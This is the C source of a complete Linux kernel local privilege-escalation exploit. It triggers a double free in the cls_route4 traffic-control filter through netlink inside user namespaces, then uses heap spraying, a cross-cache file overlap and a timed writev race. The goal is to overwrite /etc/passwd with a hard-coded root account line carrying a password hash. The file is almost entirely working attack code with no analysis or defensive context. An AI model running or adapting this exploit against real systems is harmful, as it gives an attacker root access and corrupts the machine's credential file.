#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/timerfd.h>

#include <linux/tc_ematch/tc_em_meta.h>
#include <sys/resource.h>

#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/kcmp.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/veth.h>

#include <x86intrin.h>

#include <err.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <unistd.h>

// #define DEBUG

char *target = "/etc/passwd";
char *overwrite =
    "user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash\n";
char *global;
char *self_path;
char *content;

#define PAGE_SIZE 0x1000
#define MAX_FILE_NUM 0x8000

int fds[MAX_FILE_NUM] = {};
int fd_2[MAX_FILE_NUM] = {};
int overlap_a = -1;
int overlap_b = -1;

int cpu_cores = 0;
int sockfd = -1;

int spray_num_1 = 2000;
int spray_num_2 = 4000;

// int spray_num_1 = 4000;
// int spray_num_2 = 5000;

int pipe_main[2];
int pipe_parent[2];
int pipe_child[2];
int pipe_defrag[2];
int pipe_file_spray[2][2];

int run_write = 0;
int run_spray = 0;
char *passwd;
bool overlapped = false;

void DumpHex(const void *data, size_t size) {
#ifdef DEBUG
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
#endif
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror("sched_setaffinity()");
    exit(EXIT_FAILURE);
  }
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void use_temporary_dir(void) {
  system("rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data");
  system("touch exp_dir/data2");
  char *tmpdir = "exp_dir";
  if (!tmpdir)
    exit(1);
  if (chmod(tmpdir, 0777))
    exit(1);
  if (chdir(tmpdir))
    exit(1);
  symlink("./data", "./uaf");
}

static void setup_common() {
  if (mount(0, "/sys/fs/fuse/connections", "fusectl", 0, 0)) {
  }
}

static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  // RLIMIT_FILE
  rlim.rlim_cur = rlim.rlim_max = 14096;
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
    rlim.rlim_cur = rlim.rlim_max = 4096;
    spray_num_1 = 1200;
    spray_num_2 = 2800;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("setrlimit");
      err(1, "setrlimit");
    }
  }
}

void setup_namespace() {
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (unshare(CLONE_NEWNET) != 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    exit(EXIT_FAILURE);
  }

  if (!write_file("/proc/self/setgroups", "deny")) {
    perror("[-] write_file(/proc/self/set_groups)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
    perror("[-] write_file(/proc/self/uid_map)");
    exit(EXIT_FAILURE);
  }
  if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
    perror("[-] write_file(/proc/self/gid_map)");
    exit(EXIT_FAILURE);
  }
}

#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr(char *attr, int type, void *data, int len) {
  struct rtattr *rta = (struct rtattr *)attr;

  rta->rta_type = type;
  rta->rta_len = RTA_LENGTH(len);
  if (len) {
    memcpy(RTA_DATA(attr), data, len);
  }

  return RTA_LENGTH(len);
}

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n", maxlen);
    return -1;
  }
  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}

int add_qdisc(int fd) {
  char *start = malloc(0x1000);
  memset(start, 0, 0x1000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new qdisc
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
  msg->nlmsg_type = RTM_NEWQDISC;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
  // set local
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_parent = TC_H_ROOT;
  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);

  addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

  // packing
#ifdef DEBUG
  DumpHex(msg, msg->nlmsg_len);
#endif

  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle,
            u_int16_t flags) {
  char *start = malloc(0x2000);
  memset(start, 0, 0x2000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
  addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(fd, &msgh, 0);

  free(start);
  return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
  add_tc_(sockfd, 0, handle, (handle << 8) + handle, flag);
}

uint32_t calc_handle(uint32_t from, uint32_t to) {
  uint32_t handle = to;

  assert(from <= 0xff && to <= 0xff);
  handle |= from << 16;

  if (((handle & 0x7f00) | handle) != handle)
    return 0;

  if (handle == 0 || (handle & 0x8000))
    return 0;
  return handle;
}

void *delete_tc_(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr)) {
    printf("size of sender address is wrong\n");
  }
  return start;
}

void delete_tc(int sockfd, uint32_t handle) {
  delete_tc_(sockfd, ((handle) << 8) + (handle));
}

// basic for spray
int add_tc_basic(int fd, uint32_t handle, void *spray_data, size_t spray_len,
                 int spray_count) {
  assert(spray_len * spray_count < 0x3000);
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x4000, TCA_KIND, "basic", 6);
  struct rtattr *tail = addattr_nest(msg, 0x4000, TCA_OPTIONS);
  struct rtattr *ema_tail = addattr_nest(msg, 0x4000, TCA_BASIC_EMATCHES);
  struct tcf_ematch_tree_hdr tree_hdr = {.nmatches = spray_count / 2,
                                         .progid = 0};

  addattr_l(msg, 0x4000, TCA_EMATCH_TREE_HDR, &tree_hdr, sizeof(tree_hdr));
  struct rtattr *rt_match_tail =
      addattr_nest(msg, 0x4000, TCA_EMATCH_TREE_LIST);

  char *data = malloc(0x3000);
  for (int i = 0; i < tree_hdr.nmatches; i++) {
    char *current;
    memset(data, 0, 0x3000);
    struct tcf_ematch_hdr *hdr = (struct tcf_ematch_hdr *)data;
    hdr->kind = TCF_EM_META;
    hdr->flags = TCF_EM_REL_AND;

    current = data + sizeof(*hdr);

    struct tcf_meta_hdr meta_hdr = {
        .left.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
        .right.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
    };

    current += addattr(current, TCA_EM_META_HDR, &meta_hdr, sizeof(hdr));
    current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);
    current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);

    addattr_l(msg, 0x4000, i + 1, data, current - data);
  }

  addattr_nest_end(msg, rt_match_tail);
  addattr_nest_end(msg, ema_tail);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  sendmsg(fd, &msgh, 0);
  free(data);
  free(start);
  return 1;
}

void *delete_tc_basic(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x1000, TCA_KIND, "basic", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr)) {
    printf("size of sender address is wrong\n");
  }

  return start;
}

void *slow_write() {
  printf("start slow write\n");
  clock_t start, end;
  int fd = open("./uaf", 1);

  if (fd < 0) {
    perror("error open uaf file");
    exit(-1);
  }

  unsigned long int addr = 0x30000000;
  int offset;
  for (offset = 0; offset < 0x80000 / 20; offset++) {
    void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (r < 0) {
      printf("allocate failed at 0x%x\n", offset);
    }
  }

  assert(offset > 0);

  void *mem = (void *)(addr);
  memcpy(mem, "hhhhh", 5);

  struct iovec iov[20];
  for (int i = 0; i < 20; i++) {
    iov[i].iov_base = mem;
    iov[i].iov_len = offset * 0x1000;
  }

  run_write = 1;
  start = clock();
  // 2GB max
  if (writev(fd, iov, 20) < 0) {
    perror("slow write");
  }
  end = clock();
  double spent = (double)(end - start) / CLOCKS_PER_SEC;
  printf("write done, spent %f s\n", spent);
  run_write = 0;
}

void *write_cmd() {
  // user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash
  char data[1024] =
      "user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash";
  // struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};
  struct iovec iov = {.iov_base = content, .iov_len = strlen(content)};

  while (!run_write) {
  }
  run_spray = 1;
  if (writev(overlap_a, &iov, 1) < 0) {
    printf("failed to write\n");
  }
  printf("should be after the slow write\n");
}

void pre_exploit() {
  adjust_rlimit();
  use_temporary_dir();
  setup_namespace();
}

void exploit() {
  char buf[2 * PAGE_SIZE] = {};
  char msg[0x10] = {};
  char *spray;
  int cc;
  struct rlimit old_lim, lim, new_lim;

  // Get old limits
  if (getrlimit(RLIMIT_NOFILE, &old_lim) == 0)
    printf("Old limits -> soft limit= %ld \t"
           " hard limit= %ld \n",
           old_lim.rlim_cur, old_lim.rlim_max);
  pin_on_cpu(0);
  printf("starting exploit, num of cores: %d\n", cpu_cores);

  sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
  assert(sockfd != -1);
  add_qdisc(sockfd);

  // wait for parent
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, "read from parent");
  }
  // allocate the vulnerable object
  add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);

  // ask parent to keep spraying
  if (write(pipe_parent[1], "OK", 2) != 2) {
    err(1, "write to child");
  }
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, "read from parent");
  }

  // free the object, to free the slab
  add_tc_(sockfd, 0x11, 0x12, 0, NLM_F_CREATE);

  // wait for the vulnerable object being freed
  usleep(500 * 1000);
  printf("freed the filter object\n");
  // sync
  if (write(pipe_parent[1], "OK", 2) != 2) {
    err(1, "write to child");
  }
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, "read from parent");
  }

  usleep(1000 * 1000);

  for (int i = 0; i < spray_num_1; i++) {
    pin_on_cpu(i % cpu_cores);
    fds[i] = open("./data2", 1);
    assert(fds[i] > 0);
  }

  // double free route4, which will free the file
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);
  usleep(1000 * 100);

  // should not sleep too long, otherwise file might be claimed by others
  printf("double free done\n");
  printf("spraying files\n");

  // the following is to figure out which file is freed
  for (int i = 0; i < spray_num_2; i++) {
    pin_on_cpu(i % cpu_cores);
    fd_2[i] = open("./uaf", 1);
    assert(fd_2[i] > 0);
    for (int j = 0; j < spray_num_1; j++) {
      if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==
          0) {
        printf("found overlap, id : %d, %d\n", i, j);
        overlap_a = fds[j];
        overlap_b = fd_2[i];

        pthread_t pid, pid2;
        pthread_create(&pid, NULL, slow_write, NULL);
        pthread_create(&pid2, NULL, write_cmd, NULL);

        while (!run_spray) {
        }

        close(overlap_a);
        close(overlap_b);
        printf("closed overlap\n");

        usleep(1000 * 100);

        int spray_num = 4096;
        write(pipe_file_spray[0][1], &spray_num, sizeof(int));
        if (read(pipe_file_spray[1][0], &msg, 2) != 2) {
          err(1, "read from file spray");
        }
        overlapped = true;
      }
    }
    if (overlapped)
      break;
  }

  sleep(3);
  while (run_write) {
    sleep(1);
  }

  if (!overlapped) {
    printf("no overlap found :(...\n");
    write(pipe_main[1], "\xff", 1);
  } else {
    int xx = open(target, 0);
    char buf[0x100] = {};
    // check if user in the passwd
    read(xx, buf, 0x30);
    if (!strncmp(buf, "user", 4)) {
      write(pipe_main[1], "\x00", 1);
    } else {
      printf("not successful : %s\n", buf);
      write(pipe_main[1], "\xff", 1);
    }
  }
  while (1) {
    sleep(1000);
  }
}

void post_exploit() {}

// this poc assume we have a heap address leaked
int run_exp() {
  if (pipe(pipe_parent) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_child) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_defrag) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_file_spray[0]) == -1) {
    err(1, "fail to create pipes\n");
  }

  if (pipe(pipe_file_spray[1]) == -1) {
    err(1, "fail to create pipes\n");
  }

  cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

  if (fork() == 0) {
    // thread for spraying file we want to overwrite
    adjust_rlimit();
    int spray_num = 0;
    if (read(pipe_file_spray[0][0], &spray_num, sizeof(int)) < sizeof(int)) {
      err(1, "read file spray");
    }

    printf("got cmd, start spraying %s\n", target);
    spray_num = 4096;
    if (fork() == 0) {
      for (int i = 0; i < spray_num; i++) {
        pin_on_cpu(i % cpu_cores);
        open(target, 0);
      }
      while (1) {
        sleep(10000);
      }
    }

    for (int i = 0; i < spray_num; i++) {
      pin_on_cpu(i % cpu_cores);
      open(target, 0);
    }
    printf("spray done\n");
    write(pipe_file_spray[1][1], "OK", 2);
    while (1) {
      sleep(10000);
    }
    exit(0);
  }

  if (fork() == 0) {
    pin_on_cpu(0);
    pre_exploit();
    exploit();
    post_exploit();
  } else {
    sleep(2);
    if (fork() == 0) {
      // do the defragmentation to exhaust all file slabs
      // for cross cache
      adjust_rlimit();
      for (int i = 0; i < 10000; i++) {
        pin_on_cpu(i % cpu_cores);
        open(target, 0);
      }
      printf("defrag done\n");
      if (write(pipe_defrag[1], "OK", 2) != 2) {
        err(1, "failed write defrag");
      }
      while (1) {
        sleep(1000);
      }
    } else {
      // memory spray thread
      setup_namespace();
      pin_on_cpu(0);
      int sprayfd = socket(PF_NETLINK, SOCK_RAW, 0);
      assert(sprayfd != -1);
      add_qdisc(sprayfd);

      char msg[0x10] = {};
      char payload[256] = {};
      memset(payload + 0x10, 'A', 256 - 0x10);

      if (read(pipe_defrag[0], msg, 2) != 2) {
        err(1, "failed read defrag");
      }

      // if the exploit keeps failing, please tune the middle and end
      int middle = 38;
      int end = middle + 40;

      // preparing for cross cache
      for (int i = 0; i < middle; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
      }

      add_tc_basic(sprayfd, middle + 1, payload, 193, 32);
      add_tc_basic(sprayfd, middle + 2, payload, 193, 32);
      add_tc_basic(sprayfd, middle + 3, payload, 193, 32);
      if (write(pipe_child[1], "OK", 2) != 2) {
        err(1, "write to parent\n");
      }
      // allocate route4
      if (read(pipe_parent[0], msg, 2) != 2) {
        err(1, "read from parent");
      }
      // add_tc_basic(sprayfd, middle+2, payload, 129, 32);

      // prepare another part for cross cache
      for (int i = middle + 2; i < end; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
      }
      printf("spray 256 done\n");

      for (int i = 1; i < end - 24; i++) {
        // prevent double free of 192
        // and being reclaimed by others
        if (i == middle || i == middle + 1)
          continue;
        delete_tc_basic(sprayfd, i + 1);
      }
      if (write(pipe_child[1], "OK", 2) != 2) {
        err(1, "write to parent\n");
      }
      // free route4 here
      if (read(pipe_parent[0], msg, 2) != 2) {
        err(1, "read from parent");
      }
      // if (cpu_cores == 1) sleep(1);
      delete_tc_basic(sprayfd, middle + 2);
      delete_tc_basic(sprayfd, middle + 3);
      delete_tc_basic(sprayfd, 1);
      for (int i = middle + 2; i < end; i++) {
        delete_tc_basic(sprayfd, i + 1);
      }

      printf("256 freed done\n");

      if (write(pipe_child[1], "OK", 2) != 2) {
        err(1, "write to parent\n");
      }
      while (1) {
        sleep(1000);
      }
    }
  }
}

int main(int argc, char **argv) {
  global = (char *)mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_SHARED | MAP_ANON, -1, 0);
  memset(global, 0, 0x2000);

  self_path = global;
  snprintf(self_path, 0x100, "%s/%s", get_current_dir_name(), argv[0]);
  printf("self path %s\n", self_path);

  int fd = open(target, 0);
  content = (char *)(global + 0x100);
  strcpy(content, overwrite);
  read(fd, content + strlen(overwrite), 0x1000);
  close(fd);

  assert(pipe(pipe_main) == 0);

  printf("prepare done\n");

  if (fork() == 0) {
    run_exp();
    while (1) {
      sleep(10000);
    }
  }

  char data;
  read(pipe_main[0], &data, 1);
  if (data == 0) {
    printf("succeed\n");
  } else {
    printf("failed\n");
  }
}